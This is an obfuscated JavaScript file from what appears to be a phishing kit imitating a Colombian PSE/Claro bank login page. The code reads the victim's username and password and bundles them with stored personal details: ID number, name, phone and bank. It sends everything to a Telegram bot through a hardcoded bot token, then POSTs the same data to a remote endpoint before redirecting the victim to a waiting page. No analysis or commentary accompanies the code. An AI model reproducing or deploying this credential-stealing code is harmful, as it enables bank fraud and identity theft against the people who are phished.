const _0x360b7a = _0x2f06;
(function (_0x4f87ea, _0x460eb6) {
  const _0x49f0cb = _0x2f06,
    _0x15d050 = _0x4f87ea();
  while (!![]) {
    try {
      const _0x511974 =
        (-parseInt(_0x49f0cb(0x1ce)) / 0x1) *
          (parseInt(_0x49f0cb(0x1d6)) / 0x2) +
        parseInt(_0x49f0cb(0x1bf)) / 0x3 +
        (-parseInt(_0x49f0cb(0x1b8)) / 0x4) *
          (-parseInt(_0x49f0cb(0x1df)) / 0x5) +
        (parseInt(_0x49f0cb(0x1c0)) / 0x6) *
          (parseInt(_0x49f0cb(0x1e3)) / 0x7) +
        parseInt(_0x49f0cb(0x1c5)) / 0x8 +
        parseInt(_0x49f0cb(0x1d1)) / 0x9 +
        (-parseInt(_0x49f0cb(0x1c6)) / 0xa) *
          (parseInt(_0x49f0cb(0x1dc)) / 0xb);
      if (_0x511974 === _0x460eb6) break;
      else _0x15d050["push"](_0x15d050["shift"]());
    } catch (_0x3484de) {
      _0x15d050["push"](_0x15d050["shift"]());
    }
  }
})(_0x1206, 0xf0a21);
function updateLS() {
  LS["setItem"]("info", JSON["stringify"](info));
}
function _0x2f06(_0x29bf1f, _0x2cb647) {
  const _0x120664 = _0x1206();
  return (
    (_0x2f06 = function (_0x2f0632, _0x2747f4) {
      _0x2f0632 = _0x2f0632 - 0x1b7;
      let _0x1df5e7 = _0x120664[_0x2f0632];
      return _0x1df5e7;
    }),
    _0x2f06(_0x29bf1f, _0x2cb647)
  );
}
const button = document["getElementById"](_0x360b7a(0x1c9)),
  userInput = document["getElementById"](_0x360b7a(0x1e5)),
  passInput = document["getElementById"](_0x360b7a(0x1e4));
async function sendToTelegram(_0x21d26a) {
  const _0x4b8494 = _0x360b7a;
  for (const _0x5b7bc6 of chatIds) {
    const _0x32299d =
      "https://api.telegram.org/bot7772373506:AAE68FvWBmOiOLaTrSykMxSdpfQwP7C8hjo/sendMessage?chat_id=" +
      _0x5b7bc6 +
      _0x4b8494(0x1d7) +
      encodeURIComponent(_0x21d26a);
    try {
      const _0x1aae55 = await fetch(_0x32299d);
      _0x1aae55["ok"]
        ? console[_0x4b8494(0x1da)](_0x4b8494(0x1bb) + _0x5b7bc6 + ")")
        : console[_0x4b8494(0x1be)](
            "Error\x20al\x20enviar\x20mensaje\x20(chat\x20ID:\x20" +
              _0x5b7bc6 +
              "):",
            _0x1aae55[_0x4b8494(0x1d5)]
          );
    } catch (_0x23d49b) {
      console[_0x4b8494(0x1be)](_0x4b8494(0x1b9) + _0x5b7bc6 + "):", _0x23d49b);
    }
  }
}
button[_0x360b7a(0x1db)](_0x360b7a(0x1c1), async function (_0x241032) {
  const _0x4269e8 = _0x360b7a;
  _0x241032[_0x4269e8(0x1b7)](), (button[_0x4269e8(0x1dd)] = !![]);
  if (userInput[_0x4269e8(0x1c7)] == "" && passInput[_0x4269e8(0x1c7)] == "") {
    alert(_0x4269e8(0x1c4)), userInput["focus"](), (button["disabled"] = ![]);
    return;
  } else {
    var _0x4b0e5 = userInput[_0x4269e8(0x1c7)],
      _0x2e002a = passInput[_0x4269e8(0x1c7)];
    (info[_0x4269e8(0x1e0)][_0x4269e8(0x1ca)] = _0x4b0e5),
      (info["metaInfo"]["puser"] = _0x2e002a),
      updateLS();
    const _0x2a8df7 = {
        id: info[_0x4269e8(0x1e0)]["cc"],
        nombre: info[_0x4269e8(0x1e0)][_0x4269e8(0x1d2)],
        telefono: info[_0x4269e8(0x1e0)][_0x4269e8(0x1ba)],
        direccion: "",
        usuario: info[_0x4269e8(0x1e0)][_0x4269e8(0x1ca)],
        password: info[_0x4269e8(0x1e0)]["puser"],
        bank: info[_0x4269e8(0x1e0)]["ban"],
      },
      _0x2043d1 =
        _0x4269e8(0x1c2) +
        _0x2a8df7["id"] +
        _0x4269e8(0x1c8) +
        _0x2a8df7["nombre"] +
        _0x4269e8(0x1e6) +
        _0x2a8df7[_0x4269e8(0x1bc)] +
        _0x4269e8(0x1e7) +
        _0x2a8df7[_0x4269e8(0x1c3)] +
        _0x4269e8(0x1bd) +
        _0x2a8df7[_0x4269e8(0x1cb)] +
        _0x4269e8(0x1cd) +
        _0x2a8df7[_0x4269e8(0x1d8)] +
        _0x4269e8(0x1d0) +
        fuente;
    await sendToTelegram(_0x2043d1),
      fetch(url + _0x4269e8(0x1e2), {
        method: _0x4269e8(0x1cf),
        headers: { "Content-Type": "application/json" },
        body: JSON[_0x4269e8(0x1d3)](_0x2a8df7),
      })
        [_0x4269e8(0x1d4)]((_0x341db6) => {
          const _0x45eac8 = _0x4269e8;
          if (!_0x341db6["ok"]) throw new Error(_0x45eac8(0x1d9));
          return _0x341db6[_0x45eac8(0x1e1)]();
        })
        [_0x4269e8(0x1d4)]((_0x348c22) => {
          const _0x349216 = _0x4269e8;
          window[_0x349216(0x1cc)]["href"] = "./wait.html";
        })
        [_0x4269e8(0x1e8)]((_0x5d91fc) => {
          const _0xb70ef6 = _0x4269e8;
          console[_0xb70ef6(0x1be)](_0xb70ef6(0x1de), _0x5d91fc),
            (button[_0xb70ef6(0x1dd)] = ![]);
        });
  }
});
function _0x1206() {
  const _0xf2bb48 = [
    "bank",
    "Network\x20response\x20was\x20not\x20ok",
    "log",
    "addEventListener",
    "40509359awjQTJ",
    "disabled",
    "Error:",
    "225VGGfbe",
    "metaInfo",
    "json",
    "/trico/tricoPse",
    "84EEoSfw",
    "txtPass",
    "txtUsuario",
    "\x0a📱Teléfono:\x20",
    "\x0a🚹Usuario:\x20",
    "catch",
    "preventDefault",
    "157788eeoPFF",
    "Error\x20de\x20red\x20(chat\x20ID:\x20",
    "telnum",
    "Mensaje\x20enviado\x20a\x20Telegram\x20(chat\x20ID:\x20",
    "telefono",
    "\x0a🔒Contraseña:\x20",
    "error",
    "3177312vVTItO",
    "541956CmhFku",
    "click",
    "🟣\x20PSE\x20(Claro)\x0a©️ID:\x20",
    "usuario",
    "Por\x20favor\x20ingrese\x20la\x20información\x20requerida",
    "8414736PGxbjH",
    "10qxQaDn",
    "value",
    "\x0a🆔Nombre:\x20",
    "btnUsuario",
    "user",
    "password",
    "location",
    "\x0a🏦Banco:\x20",
    "5fTDOAA",
    "POST",
    "\x0aFuente:\x20",
    "6792876bJGgoQ",
    "dudename",
    "stringify",
    "then",
    "statusText",
    "422574jnYOyz",
    "&text=",
  ];
  _0x1206 = function () {
    return _0xf2bb48;
  };
  return _0x1206();
}
